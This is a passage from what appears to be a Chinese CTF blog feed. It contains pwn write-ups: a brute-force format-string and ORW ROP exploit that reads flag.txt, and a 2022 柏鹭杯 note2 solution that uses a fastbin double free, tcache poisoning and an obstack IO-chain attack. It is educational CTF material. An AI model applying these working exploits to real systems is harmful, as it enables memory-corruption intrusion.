class="line">payload+=p64(mprotect)+p64(leak_stack_addr+<span class="number">0x120</span>+<span class="number">0x1c0</span>)</span><br><span class="line">payload+=asm(shellcraft.cat(<span class="string">&quot;flag.txt&quot;</span>, <span class="number">2</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="笨比在比赛写的exp"><a href="#笨比在比赛写的exp" class="headerlink" title="笨比在比赛写的exp"></a>笨比在比赛写的exp</h2><p>我最开始考虑的方法是劫持栈里存放的一个ld.so的指针，这个指针可以影响在exit调用链上的一个call，所以在此处劫持执行流，然后再不断用格式化字符去劫持printf自己的返回地址，期间利用格式化字符串来完成stdout的重定向，而且这里还需要爆破，然后还有一个排序的那里为了保证是两个字节占位也需要爆破（但是赛后我想了一下，再好好处理一下，这里的爆破应该就能免了），然后重定向之后，最后一次payload里面既有格式化字符串，也有rop链，所以我采用的方式是用csu中的片段将格式化字符串给弹出去，至此执行流到我的rop链上。(这个权当记录一下吧，因为太麻烦(爆破的概率太低，具体概率多大我也没算不过应该爆个三四百次才能出一次把)，参考意义不大)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeat</span>():</span><br><span class="line">    p.sendafter(<span class="string">&#x27;username:&#x27;</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">    leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_stack_addr&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;username:&#x27;</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    leak_base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    base_addr=leak_base_addr-<span class="number">0x11a0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    start_addr=base_addr+<span class="number">0x140B</span><span class="comment">#0x148C</span></span><br><span class="line">    bss_addr=base_addr+<span class="number">0x4048</span></span><br><span class="line">    bss_hook=(bss_addr-<span class="number">0x3d60</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">    l1=(start_addr)&amp;<span class="number">0xff</span></span><br><span class="line">    l2=(start_addr&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    m1=(start_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    m2=(start_addr&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    h1=(start_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    h2=(start_addr&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="comment"># bss_h=(bss_hook)&amp;0xff</span></span><br><span class="line">    <span class="comment"># bss_l=(bss_hook&gt;&gt;8)&amp;0xff</span></span><br><span class="line">    log_addr(<span class="string">&#x27;m1&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;l1&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;h1&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;h2&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;l2&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;m2&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;start_addr&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;bss_hook&#x27;</span>)</span><br><span class="line">    dic=&#123;l1:<span class="number">0</span>,l2:<span class="number">1</span>,m1:<span class="number">2</span>,m2:<span class="number">3</span>,h1:<span class="number">4</span>,h2:<span class="number">5</span>&#125;</span><br><span class="line">    <span class="built_in">list</span>=[l1,l2,h1,h2,m1,m2]</span><br><span class="line">    list_sort=<span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line">    <span class="built_in">print</span>(list_sort)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> bss_hook&lt;<span class="number">0x2000</span> <span class="keyword">and</span> (list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> bss_hook&gt;<span class="number">0x3e8</span> <span class="keyword">and</span> (list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>])&gt;<span class="number">9</span> <span class="keyword">and</span> (list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>])&gt;<span class="number">9</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;------&gt;success&lt;------&#x27;</span>)</span><br><span class="line">        payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">1</span>]-list_sort[<span class="number">0</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%17$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">2</span>]-list_sort[<span class="number">1</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%18$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">3</span>]-list_sort[<span class="number">2</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%19$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">4</span>]-list_sort[<span class="number">3</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%20$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(list_sort[<span class="number">5</span>]-list_sort[<span class="number">4</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%21$hhn&#x27;</span></span><br><span class="line">        payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(bss_hook-list_sort[<span class="number">5</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%284$hna&#x27;</span></span><br><span class="line">        payload+=p64(bss_addr+dic[list_sort[<span class="number">0</span>]])+p64(bss_addr+dic[list_sort[<span class="number">1</span>]])+p64(bss_addr+dic[list_sort[<span class="number">2</span>]])</span><br><span class="line">        payload+=p64(bss_addr+dic[list_sort[<span class="number">3</span>]])+p64(bss_addr+dic[list_sort[<span class="number">4</span>]])+p64(bss_addr+dic[list_sort[<span class="number">5</span>]])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    stdout=base_addr+<span class="number">0x4020</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line">    return_addr=leak_stack_addr-<span class="number">0xf8</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8C</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%8$hhnaaaaa&#x27;</span>+p64(return_addr)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;aaaaaaaaaaaaaaaa%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x7C</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaaa&#x27;</span>+p64(return_addr)+p64(stdout)+p64(stdout+<span class="number">1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0x14B9,0x146C)</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8c</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%11$hhn%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xc0</span>-<span class="number">0x8c</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%12$hhn%&#x27;</span></span><br><span class="line">    payload+=<span class="built_in">str</span>(<span class="number">0xd5</span>-<span class="number">0xc0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%13$hhn%265$p&#x27;</span>+p64(return_addr)+p64(stdout)+p64(stdout+<span class="number">1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;info1&#x27;</span>,p.recv())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">b&#x27;%265$p%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8c</span>-<span class="number">14</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaaaaaaaaaaaaa&#x27;</span>+p64(return_addr)+p64(stdout)+p64(stdout+<span class="number">1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>,timeout=<span class="number">0.5</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;============&gt; YES &lt;==============&#x27;</span>)</span><br><span class="line">    libc_base_addr=leak_libc_addr-<span class="number">0x440f6b</span><span class="comment">#0x440f5b</span></span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">    pop_rdi=base_addr+<span class="number">0x1543</span></span><br><span class="line">    pop_rsi_r15=base_addr+<span class="number">0x1541</span></span><br><span class="line">    pop_rdx_r12=libc_base_addr+<span class="number">0x119211</span><span class="comment">#0x119241</span></span><br><span class="line">    open_addr=libc_base_addr+<span class="number">0x10dce0</span><span class="comment">#0x10dd10+</span></span><br><span class="line">    write_addr=libc_base_addr+<span class="number">0x10e060</span><span class="comment">#0x10e090+</span></span><br><span class="line">    read_addr=libc_base_addr+<span class="number">0x10dfc0</span><span class="comment">#0x10dff0+</span></span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0x14B9,0x146C)</span></span><br><span class="line">    csu_addr_l=(<span class="number">0x153b</span>+base_addr)&amp;<span class="number">0xff</span></span><br><span class="line">    csu_addr_h=((<span class="number">0x153b</span>+base_addr)&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    log_addr(<span class="string">&#x27;csu_addr_l&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;csu_addr_h&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> csu_addr_h&gt;csu_addr_l:</span><br><span class="line">        payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_l).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%9$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_h-csu_addr_l).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaa&#x27;</span>+p64(return_addr)+p64(return_addr+<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_h).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%9$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_l-csu_addr_h).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaa&#x27;</span>+p64(return_addr+<span class="number">1</span>)+p64(return_addr)</span><br><span class="line">    <span class="comment">#rop=b&#x27;aaaaaaaaaaaaaaaa%&#x27;+str(csu_addr).encode(&#x27;utf-8&#x27;)+b&#x27;c%10$hnaaaaa&#x27;+p64(return_addr)+p64(stdout)+p64(stdout+1)</span></span><br><span class="line">    rop=payload</span><br><span class="line">    rop+=p64(pop_rdi)+p64(return_addr+<span class="number">8</span>+<span class="number">0xc0</span>+<span class="number">40</span>)</span><br><span class="line">    rop+=p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(open_addr)</span><br><span class="line">    </span><br><span class="line">    rop+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">    rop+=p64(pop_rsi_r15)+p64(return_addr+<span class="number">0x200</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line">    rop+=p64(pop_rdi)+p64(<span class="number">2</span>)</span><br><span class="line">    rop+=p64(pop_rsi_r15)+p64(return_addr+<span class="number">0x200</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(write_addr)</span><br><span class="line">    rop+=<span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">len</span>(rop))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(rop)</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&#x27;192.168.1.106&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">    i=i+<span class="number">1</span>   </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;------------&gt;&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;&lt;--------------&#x27;</span>)</span><br><span class="line">    pwn()</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012005681.png"></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>orw</tag>
        <tag>close关闭文件描述符</tag>
        <tag>magic_gadget</tag>
      </tags>
  </entry>
  <entry>
    <title>2022柏鹭杯-note2</title>
    <url>/posts/f523ff3f.html</url>
    <content><![CDATA[<p>通过本题的学习明白了，高版本中 <code>fastbin</code> 做出 <code>double free</code> 是如何打 <code>tcache poisoning</code> 的过程。并且了解到了一条新的 <code>IO</code> 链，目前感觉是最好用的一条，可以通杀 <code>2.36</code> 及以下的 <code>libc</code> 版本 具体请见 <a href="https://tttang.com/archive/1845/">文章</a></p>
<span id="more"></span>

<p>这位师傅提供了题目附件  <a href="https://www.cnblogs.com/tolele/p/16701827.html">2022年柏鹭杯 pwn题复现 - tolele - 博客园 (cnblogs.com)</a></p>
<h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p>本题存在一个 <code>UAF</code> 漏洞，并且可以无限次的使用 <code>add</code> 和 <code>delete</code> <code>show</code> 函数，<code>size</code> 被限定到了 <code>0x200</code> 以下，并且可以触发 <code>exit</code> 函数退出。（ <code>libc</code> 版本为 <code>2.35</code>）</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>因为没有 <code>edit</code> 函数，因此我们考虑 <code>double free</code> ，但由于 <code>key</code> 机制的存在，无法直接在 <code>tcache bin</code> 直接打 <code>double free</code>，解决方法有两种，第一是 <a href="https://zikh26.github.io/posts/6b7e3e3a.html#house-of-botcake">house of botcake</a> ，这个方法本题是可以打通的，不过主要的学习收获是第二种方法，就是填满 <code>tcache bin</code> ，然后在 <code>fast bin</code>中做出 <code>double free</code> ，再打 <code>tcache poisoning</code> 将 <code>IO_list_all</code> 申请出来写入堆地址，从而触发最后的 <code>IO attack</code>。</p>
<p>本文主要介绍在 <code>fastbin</code> 中做出的 <code>double free</code> 是如何打出 <code>tcache poisoning </code> ，至于 <code>safe-Linking</code> 机制的绕过和 <code>IO_attack</code> 不再介绍。</p>
<h3 id="double-free-与-tcache-poisoning"><a href="#double-free-与-tcache-poisoning" class="headerlink" title="double free 与 tcache poisoning"></a><code>double free</code> 与 <code>tcache poisoning</code></h3><p><code>malloc</code> 函数内部执行会先进入 <code>libc_malloc</code> 函数，判断是否 <code>tcache bin</code>  的链上有需要的堆块，如果没有的话则进入 <code>int_malloc</code> 函数（有的话则申请出来，直接返回）</p>
<p>在 <code>int_malloc</code> 函数的最开始就去判断了 <code>fastbin</code> 中对应的链上是否有所需要的堆块，如果有的话就将该堆块取出，作为接下来要返回给用户的堆块。同时去判断这条链上是否还有堆块，如果还有堆块并且 <code>tcache bin</code> 上对应的这条链还有空位置，就将 <code>fastbin</code> 剩下的堆块都放入 <code>tcache bin</code> 中（除非 <code>tcache bin</code> 被填满了）</p>
<p>本题 <code>double free</code> 以及 <code>tcache poisoning</code> 的利用思路是先将 <code>tcache bin</code> 填满，然后正常的在 <code>fastbin</code> 链中做出 <code>double free</code> （如 <code>A-&gt;B-&gt;A</code>）</p>
<p>接着再将 <code>tcache bin</code> 中的堆块全部取出（此时的情况如下）   <strong>注意： <code>fastbin</code> 中的 <code>fd</code> 指针也是经过了异或运算的</strong></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304202244388.png" alt="image-20230420224449196"></p>
<p><code>ptmalloc</code> 对于 <code>fastbin</code> 中堆块移入 <code>tcache bin</code> 的机制是这样处理的。（最初的结构为 <code>A-&gt;B-&gt;A</code>）（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304202330662.png" alt="image-20230420233034606"></p>
<ol>
<li>首先判断 <code>fastbin</code> 中第一个堆块 <code>A</code> 的 <code>fd</code> 指针是否为空，来检测该链是否还有其他堆块</li>
<li>无论该链是否有其他堆块，都会将 <code>A</code> 取出来暂存（为之后返回给用户做准备），而将 <code>A</code> 取出后 <code>fastbin</code> 中的结构变成了 <code>B-&gt;A-&gt;B</code></li>
<li>如果该 <code>fastbin</code> 链已经没有其他堆块了，那么就将刚刚的 <code>A</code> 返回给用户</li>
<li>如果检测出该链还有其他堆块，并且 <code>tcache bin</code> 对应的这条链没有满，就逐个将堆块链出 <code>fastbin</code> ，链入 <code>tcache bin</code> </li>
<li>因为此时的 <code>tcache bin</code> 是空的，那就不考虑 <code>tcache bin</code> 被装满的这个限制，上面提到此时的结构是 <code>B-&gt;A-&gt;B</code> ，先去移动当前 <code>fastbin</code> 的第一个堆块 <code>B</code> ，因为 <code>double free</code> 的特殊性，在从 <code>fastbin</code>  取出一个堆块 <code>B</code> 后，其结构变为了 <code>A-&gt;B-&gt;A</code> <strong>此时刚刚取出的堆块还没有进入 <code>tcache bin</code></strong></li>
<li>刚刚这个取出的堆块链入到 <code>tcache bin</code> 时，其 <code>next</code> 指针一定会被置成 <code>0</code>，因为 <code>tcache bin</code> 最初是没有堆块的，此时的 <code>fastbin</code>  结构会受到 <code>tcache bin</code> 中堆块 <code>B</code> <code>next</code> 指针置 <code>0</code> 的影响，从而结构变成了 <code>A-&gt;B-&gt;0</code> （因为这个置空的 <code>next</code> 指针是 <code>B</code> 堆块的，因此并不会干扰到 <code>A-&gt;B</code> 的这个关系）</li>
<li>依次类推，从 <code>fastbin</code> 中取出 <code>A</code>然后再放入到 <code>tcachebin</code> 中，此时的 <code>fastbin</code> 为 <code>B-&gt;0</code> ，<code>tcache bin</code> 为 <code>A-&gt;B</code>（ <code>LIFO</code> ） </li>
<li><code>fastbin</code> 中最后一个 <code>B</code> 进入 <code>tcache bin</code> ，此时 <code>tcache bin</code> 的结构为 <code>B-&gt;A-&gt;B</code> （由于确实是有三个堆块进入了 <code>tcache bin</code> 所以此时的 <code>tcache_counts</code> 为 <code>3</code>）</li>
</ol>
<p>因为最初就确定了申请出去的是 <code>A</code>，所以 <code>malloc</code> 返回出来 <code>A</code> 后，将数据写入 <code>A</code> 中篡改 <code>next</code> 指针（因为 <code>A</code> 此时还在 <code>tcache bin</code> 中），从而完成了 <code>tcache poisoning</code> 。因此写入数据后的结构为 <code>B-&gt;A-&gt;address</code> （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304202330323.png" alt="image-20230420233021223"></p>
<p>简单总结一下：将 <code>tcache bin</code> 填满，然后在 <code>fastbin</code> 中做 <code>double free</code> ，申请出一个堆块后，可以直接打 <code>tcache poisoning</code> ，并且不用担心 <code>tcache_counts</code> 的问题</p>
<p>因为将 <code>IO_list_all</code> 申请出来了，后面就是 <code>IO_FILE</code> 的伪造和布局，本文重点不在这里，就此略过。不过 <a href="https://zikh26.github.io/posts/ad411136.html">tools函数库</a> 封装了该 <code>obstack</code> 链的攻击模板，直接使用即可。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;note2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Enter content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x219ce0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------leak key----------------</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line">par=&#123;</span><br><span class="line">    <span class="string">&quot;io_obstack_jumps&quot;</span>:libc_base+<span class="number">0x2163c0</span></span><br><span class="line">    ,<span class="string">&quot;system&quot;</span>:libc_base+<span class="number">0x50d60</span></span><br><span class="line">&#125;</span><br><span class="line">par_dict=create_dict(par)</span><br><span class="line">heap_addr=<span class="number">0x1020</span>+heap_base <span class="comment">#位于io_list_all的chunk用户区</span></span><br><span class="line">payload=obstack_attack(heap_addr-<span class="number">0x10</span>,par_dict)</span><br><span class="line"><span class="comment">#--------------------------------------------------</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x200</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x154C</span>,<span class="number">0x1540</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io_list_all=((heap_base+<span class="number">0xf40</span>)&gt;&gt;<span class="number">12</span>)^(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,p64(io_list_all))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,p64(heap_addr-<span class="number">0x10</span>))<span class="comment">#get io_list_all</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211042218.png" alt="image-20230421104243994"></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>orw</tag>
        <tag>IO attack</tag>
        <tag>double free</tag>
        <tag>高版本libc</tag>
        <tag>tcache poisoning</tag>
      </tags>
  </entry>
  <entry>
    <title>2022强网杯 强网先锋-devnull wp</title>
    <url>/posts/e9a7fcac.html</url>
